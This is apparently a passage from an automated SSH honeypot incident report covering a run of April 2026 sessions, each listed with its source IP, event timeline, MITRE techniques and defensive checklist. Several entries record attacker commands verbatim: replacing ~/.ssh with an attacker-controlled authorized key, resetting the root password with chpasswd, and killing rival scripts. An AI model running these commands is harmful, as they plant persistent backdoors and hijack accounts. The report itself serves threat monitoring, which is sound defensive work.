| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:09:59` | `cowrie.session.connect` |
| `2026-04-15 04:09:59` | `cowrie.client.version` |
| `2026-04-15 04:09:59` | `cowrie.client.kex` |
| `2026-04-15 04:10:00` | `cowrie.login.success` |
| `2026-04-15 04:10:00` | `cowrie.session.params` |
| `2026-04-15 04:10:00` | `cowrie.command.input` |
| `2026-04-15 04:10:00` | `cowrie.command.failed` |
| `2026-04-15 04:10:00` | `cowrie.log.closed` |
| `2026-04-15 04:10:01` | `cowrie.session.params` |
| `2026-04-15 04:10:01` | `cowrie.command.input` |
| `2026-04-15 04:10:01` | `cowrie.session.file_download` |
| `2026-04-15 04:10:01` | `cowrie.log.closed` |
| `2026-04-15 04:10:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.222.244[.]226` to AbuseIPDB if not already reported
- [ ] Block `58.222.244[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65d08df9174b

| Field | Detail |
|---|---|
| **Source IP** | `58.222.244[.]226` |
| **First Seen** | 2026-04-15 04:10 |
| **Last Seen** | 2026-04-15 04:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:10:03` | `cowrie.session.connect` |
| `2026-04-15 04:10:03` | `cowrie.client.version` |
| `2026-04-15 04:10:03` | `cowrie.client.kex` |
| `2026-04-15 04:10:04` | `cowrie.login.success` |
| `2026-04-15 04:10:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.222.244[.]226` to AbuseIPDB if not already reported
- [ ] Block `58.222.244[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a98c83c42a73

| Field | Detail |
|---|---|
| **Source IP** | `180.184.82[.]249` |
| **First Seen** | 2026-04-15 04:10 |
| **Last Seen** | 2026-04-15 04:15 |
| **Session Duration** | 300s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:10:37` | `cowrie.session.connect` |
| `2026-04-15 04:10:37` | `cowrie.client.version` |
| `2026-04-15 04:10:37` | `cowrie.client.kex` |
| `2026-04-15 04:10:38` | `cowrie.login.success` |
| `2026-04-15 04:10:38` | `cowrie.session.params` |
| `2026-04-15 04:10:38` | `cowrie.command.input` |
| `2026-04-15 04:10:38` | `cowrie.command.failed` |
| `2026-04-15 04:10:38` | `cowrie.log.closed` |
| `2026-04-15 04:10:39` | `cowrie.session.params` |
| `2026-04-15 04:10:39` | `cowrie.command.input` |
| `2026-04-15 04:15:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.82[.]249` to AbuseIPDB if not already reported
- [ ] Block `180.184.82[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93e629388c75

| Field | Detail |
|---|---|
| **Source IP** | `180.184.82[.]249` |
| **First Seen** | 2026-04-15 04:10 |
| **Last Seen** | 2026-04-15 04:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:10:47` | `cowrie.session.connect` |
| `2026-04-15 04:10:47` | `cowrie.client.version` |
| `2026-04-15 04:10:47` | `cowrie.client.kex` |
| `2026-04-15 04:10:48` | `cowrie.login.success` |
| `2026-04-15 04:10:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.82[.]249` to AbuseIPDB if not already reported
- [ ] Block `180.184.82[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e5ae61fd627

| Field | Detail |
|---|---|
| **Source IP** | `101.126.89[.]35` |
| **First Seen** | 2026-04-15 04:11 |
| **Last Seen** | 2026-04-15 04:12 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:bLfID3pS36TI"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:11:47` | `cowrie.session.connect` |
| `2026-04-15 04:11:47` | `cowrie.client.version` |
| `2026-04-15 04:11:47` | `cowrie.client.kex` |
| `2026-04-15 04:11:48` | `cowrie.login.success` |
| `2026-04-15 04:11:48` | `cowrie.session.params` |
| `2026-04-15 04:11:48` | `cowrie.command.input` |
| `2026-04-15 04:11:48` | `cowrie.command.failed` |
| `2026-04-15 04:11:48` | `cowrie.log.closed` |
| `2026-04-15 04:11:49` | `cowrie.session.params` |
| `2026-04-15 04:11:49` | `cowrie.command.input` |
| `2026-04-15 04:11:49` | `cowrie.session.file_download` |
| `2026-04-15 04:11:49` | `cowrie.log.closed` |
| `2026-04-15 04:12:05` | `cowrie.session.params` |
| `2026-04-15 04:12:05` | `cowrie.command.input` |
| `2026-04-15 04:12:05` | `cowrie.log.closed` |
| `2026-04-15 04:12:06` | `cowrie.session.params` |
| `2026-04-15 04:12:06` | `cowrie.command.input` |
| `2026-04-15 04:12:06` | `cowrie.log.closed` |
| `2026-04-15 04:12:07` | `cowrie.session.params` |
| `2026-04-15 04:12:07` | `cowrie.command.input` |
| `2026-04-15 04:12:07` | `cowrie.session.file_download` |
| `2026-04-15 04:12:07` | `cowrie.log.closed` |
| `2026-04-15 04:12:07` | `cowrie.session.params` |
| `2026-04-15 04:12:07` | `cowrie.command.input` |
| `2026-04-15 04:12:08` | `cowrie.log.closed` |
| `2026-04-15 04:12:08` | `cowrie.session.params` |
| `2026-04-15 04:12:08` | `cowrie.command.input` |
| `2026-04-15 04:12:08` | `cowrie.log.closed` |
| `2026-04-15 04:12:08` | `cowrie.session.params` |
| `2026-04-15 04:12:09` | `cowrie.command.input` |
| `2026-04-15 04:12:09` | `cowrie.command.input` |
| `2026-04-15 04:12:09` | `cowrie.log.closed` |
| `2026-04-15 04:12:09` | `cowrie.session.params` |
| `2026-04-15 04:12:09` | `cowrie.command.input` |
| `2026-04-15 04:12:09` | `cowrie.log.closed` |
| `2026-04-15 04:12:10` | `cowrie.session.params` |
| `2026-04-15 04:12:10` | `cowrie.command.input` |
| `2026-04-15 04:12:10` | `cowrie.log.closed` |
| `2026-04-15 04:12:11` | `cowrie.session.params` |
| `2026-04-15 04:12:11` | `cowrie.command.input` |
| `2026-04-15 04:12:11` | `cowrie.log.closed` |
| `2026-04-15 04:12:11` | `cowrie.session.params` |
| `2026-04-15 04:12:11` | `cowrie.command.input` |
| `2026-04-15 04:12:11` | `cowrie.log.closed` |
| `2026-04-15 04:12:12` | `cowrie.session.params` |
| `2026-04-15 04:12:12` | `cowrie.command.input` |
| `2026-04-15 04:12:12` | `cowrie.log.closed` |
| `2026-04-15 04:12:13` | `cowrie.session.params` |
| `2026-04-15 04:12:13` | `cowrie.command.input` |
| `2026-04-15 04:12:13` | `cowrie.log.closed` |
| `2026-04-15 04:12:13` | `cowrie.session.params` |
| `2026-04-15 04:12:13` | `cowrie.command.input` |
| `2026-04-15 04:12:13` | `cowrie.log.closed` |
| `2026-04-15 04:12:14` | `cowrie.session.params` |
| `2026-04-15 04:12:14` | `cowrie.command.input` |
| `2026-04-15 04:12:14` | `cowrie.log.closed` |
| `2026-04-15 04:12:14` | `cowrie.session.params` |
| `2026-04-15 04:12:14` | `cowrie.command.input` |
| `2026-04-15 04:12:14` | `cowrie.log.closed` |
| `2026-04-15 04:12:15` | `cowrie.session.params` |
| `2026-04-15 04:12:15` | `cowrie.command.input` |
| `2026-04-15 04:12:15` | `cowrie.log.closed` |
| `2026-04-15 04:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.89[.]35` to AbuseIPDB if not already reported
- [ ] Block `101.126.89[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e127bc0c3a73

| Field | Detail |
|---|---|
| **Source IP** | `43.153.12[.]68` |
| **First Seen** | 2026-04-15 04:12 |
| **Last Seen** | 2026-04-15 04:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:12:02` | `cowrie.session.connect` |
| `2026-04-15 04:12:02` | `cowrie.client.version` |
| `2026-04-15 04:12:03` | `cowrie.client.kex` |
| `2026-04-15 04:12:04` | `cowrie.login.success` |
| `2026-04-15 04:12:04` | `cowrie.session.params` |
| `2026-04-15 04:12:04` | `cowrie.command.input` |
| `2026-04-15 04:12:04` | `cowrie.command.failed` |
| `2026-04-15 04:12:05` | `cowrie.log.closed` |
| `2026-04-15 04:12:05` | `cowrie.session.params` |
| `2026-04-15 04:12:05` | `cowrie.command.input` |
| `2026-04-15 04:12:05` | `cowrie.session.file_download` |
| `2026-04-15 04:12:05` | `cowrie.log.closed` |
| `2026-04-15 04:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.12[.]68` to AbuseIPDB if not already reported
- [ ] Block `43.153.12[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c35948286e6e

| Field | Detail |
|---|---|
| **Source IP** | `43.153.12[.]68` |
| **First Seen** | 2026-04-15 04:12 |
| **Last Seen** | 2026-04-15 04:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:12:08` | `cowrie.session.connect` |
| `2026-04-15 04:12:08` | `cowrie.client.version` |
| `2026-04-15 04:12:09` | `cowrie.client.kex` |
| `2026-04-15 04:12:10` | `cowrie.login.success` |
| `2026-04-15 04:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.12[.]68` to AbuseIPDB if not already reported
- [ ] Block `43.153.12[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6ed4a38ede2

| Field | Detail |
|---|---|
| **Source IP** | `43.153.12[.]68` |
| **First Seen** | 2026-04-15 04:12 |
| **Last Seen** | 2026-04-15 04:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:12:38` | `cowrie.session.connect` |
| `2026-04-15 04:12:38` | `cowrie.client.version` |
| `2026-04-15 04:12:38` | `cowrie.client.kex` |
| `2026-04-15 04:12:39` | `cowrie.login.success` |
| `2026-04-15 04:12:40` | `cowrie.session.params` |
| `2026-04-15 04:12:40` | `cowrie.command.input` |
| `2026-04-15 04:12:40` | `cowrie.command.failed` |
| `2026-04-15 04:12:40` | `cowrie.log.closed` |
| `2026-04-15 04:12:40` | `cowrie.session.params` |
| `2026-04-15 04:12:40` | `cowrie.command.input` |
| `2026-04-15 04:12:41` | `cowrie.session.file_download` |
| `2026-04-15 04:12:41` | `cowrie.log.closed` |
| `2026-04-15 04:12:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.12[.]68` to AbuseIPDB if not already reported
- [ ] Block `43.153.12[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a48a5bd66b72

| Field | Detail |
|---|---|
| **Source IP** | `43.153.12[.]68` |
| **First Seen** | 2026-04-15 04:12 |
| **Last Seen** | 2026-04-15 04:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:12:44` | `cowrie.session.connect` |
| `2026-04-15 04:12:44` | `cowrie.client.version` |
| `2026-04-15 04:12:44` | `cowrie.client.kex` |
| `2026-04-15 04:12:45` | `cowrie.login.success` |
| `2026-04-15 04:12:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.12[.]68` to AbuseIPDB if not already reported
- [ ] Block `43.153.12[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8830e520805b

| Field | Detail |
|---|---|
| **Source IP** | `14.103.120[.]138` |
| **First Seen** | 2026-04-15 04:14 |
| **Last Seen** | 2026-04-15 04:14 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Bl9BTY0IDN6j"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:14:28` | `cowrie.session.connect` |
| `2026-04-15 04:14:28` | `cowrie.client.version` |
| `2026-04-15 04:14:28` | `cowrie.client.kex` |
| `2026-04-15 04:14:29` | `cowrie.login.success` |
| `2026-04-15 04:14:30` | `cowrie.session.params` |
| `2026-04-15 04:14:30` | `cowrie.command.input` |
| `2026-04-15 04:14:30` | `cowrie.command.failed` |
| `2026-04-15 04:14:30` | `cowrie.log.closed` |
| `2026-04-15 04:14:30` | `cowrie.session.params` |
| `2026-04-15 04:14:30` | `cowrie.command.input` |
| `2026-04-15 04:14:30` | `cowrie.session.file_download` |
| `2026-04-15 04:14:30` | `cowrie.log.closed` |
| `2026-04-15 04:14:42` | `cowrie.session.params` |
| `2026-04-15 04:14:42` | `cowrie.command.input` |
| `2026-04-15 04:14:43` | `cowrie.log.closed` |
| `2026-04-15 04:14:43` | `cowrie.session.params` |
| `2026-04-15 04:14:43` | `cowrie.command.input` |
| `2026-04-15 04:14:43` | `cowrie.log.closed` |
| `2026-04-15 04:14:43` | `cowrie.session.params` |
| `2026-04-15 04:14:43` | `cowrie.command.input` |
| `2026-04-15 04:14:44` | `cowrie.session.file_download` |
| `2026-04-15 04:14:44` | `cowrie.log.closed` |
| `2026-04-15 04:14:44` | `cowrie.session.params` |
| `2026-04-15 04:14:44` | `cowrie.command.input` |
| `2026-04-15 04:14:44` | `cowrie.log.closed` |
| `2026-04-15 04:14:44` | `cowrie.session.params` |
| `2026-04-15 04:14:44` | `cowrie.command.input` |
| `2026-04-15 04:14:45` | `cowrie.log.closed` |
| `2026-04-15 04:14:45` | `cowrie.session.params` |
| `2026-04-15 04:14:45` | `cowrie.command.input` |
| `2026-04-15 04:14:45` | `cowrie.command.input` |
| `2026-04-15 04:14:45` | `cowrie.log.closed` |
| `2026-04-15 04:14:45` | `cowrie.session.params` |
| `2026-04-15 04:14:45` | `cowrie.command.input` |
| `2026-04-15 04:14:46` | `cowrie.log.closed` |
| `2026-04-15 04:14:46` | `cowrie.session.params` |
| `2026-04-15 04:14:46` | `cowrie.command.input` |
| `2026-04-15 04:14:46` | `cowrie.log.closed` |
| `2026-04-15 04:14:46` | `cowrie.session.params` |
| `2026-04-15 04:14:46` | `cowrie.command.input` |
| `2026-04-15 04:14:46` | `cowrie.log.closed` |
| `2026-04-15 04:14:47` | `cowrie.session.params` |
| `2026-04-15 04:14:47` | `cowrie.command.input` |
| `2026-04-15 04:14:47` | `cowrie.log.closed` |
| `2026-04-15 04:14:47` | `cowrie.session.params` |
| `2026-04-15 04:14:47` | `cowrie.command.input` |
| `2026-04-15 04:14:47` | `cowrie.log.closed` |
| `2026-04-15 04:14:48` | `cowrie.session.params` |
| `2026-04-15 04:14:48` | `cowrie.command.input` |
| `2026-04-15 04:14:48` | `cowrie.log.closed` |
| `2026-04-15 04:14:48` | `cowrie.session.params` |
| `2026-04-15 04:14:48` | `cowrie.command.input` |
| `2026-04-15 04:14:48` | `cowrie.log.closed` |
| `2026-04-15 04:14:49` | `cowrie.session.params` |
| `2026-04-15 04:14:49` | `cowrie.command.input` |
| `2026-04-15 04:14:49` | `cowrie.log.closed` |
| `2026-04-15 04:14:49` | `cowrie.session.params` |
| `2026-04-15 04:14:49` | `cowrie.command.input` |
| `2026-04-15 04:14:49` | `cowrie.log.closed` |
| `2026-04-15 04:14:50` | `cowrie.session.params` |
| `2026-04-15 04:14:50` | `cowrie.command.input` |
| `2026-04-15 04:14:50` | `cowrie.log.closed` |
| `2026-04-15 04:14:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.120[.]138` to AbuseIPDB if not already reported
- [ ] Block `14.103.120[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2513628cb01b

| Field | Detail |
|---|---|
| **Source IP** | `43.153.12[.]68` |
| **First Seen** | 2026-04-15 04:15 |
| **Last Seen** | 2026-04-15 04:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:15:03` | `cowrie.session.connect` |
| `2026-04-15 04:15:03` | `cowrie.client.version` |
| `2026-04-15 04:15:03` | `cowrie.client.kex` |
| `2026-04-15 04:15:04` | `cowrie.login.success` |
| `2026-04-15 04:15:05` | `cowrie.session.params` |
| `2026-04-15 04:15:05` | `cowrie.command.input` |
| `2026-04-15 04:15:05` | `cowrie.command.failed` |
| `2026-04-15 04:15:05` | `cowrie.log.closed` |
| `2026-04-15 04:15:06` | `cowrie.session.params` |
| `2026-04-15 04:15:06` | `cowrie.command.input` |
| `2026-04-15 04:15:06` | `cowrie.session.file_download` |
| `2026-04-15 04:15:06` | `cowrie.log.closed` |
| `2026-04-15 04:15:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.12[.]68` to AbuseIPDB if not already reported
- [ ] Block `43.153.12[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5e07eefc0b1

| Field | Detail |
|---|---|
| **Source IP** | `43.153.12[.]68` |
| **First Seen** | 2026-04-15 04:15 |
| **Last Seen** | 2026-04-15 04:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 04:15:09` | `cowrie.session.connect` |
| `2026-04-15 04:15:09` | `cowrie.client.version` |
| `2026-04-15 04:15:09` | `cowrie.client.kex` |
| `2026-04-15 04:15:10` | `cowrie.login.success` |
| `2026-04-15 04:15:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.153.12[.]68` to AbuseIPDB if not already reported
- [ ] Block `43.153.12[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d00ea20988d4

| Field | Detail |
|---|---|
| **Source IP** | `14.103.120[.]138` |
| **First Seen** | 2026-04-15 04:16 |
| **Last Seen** | 2026-04-15 04:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
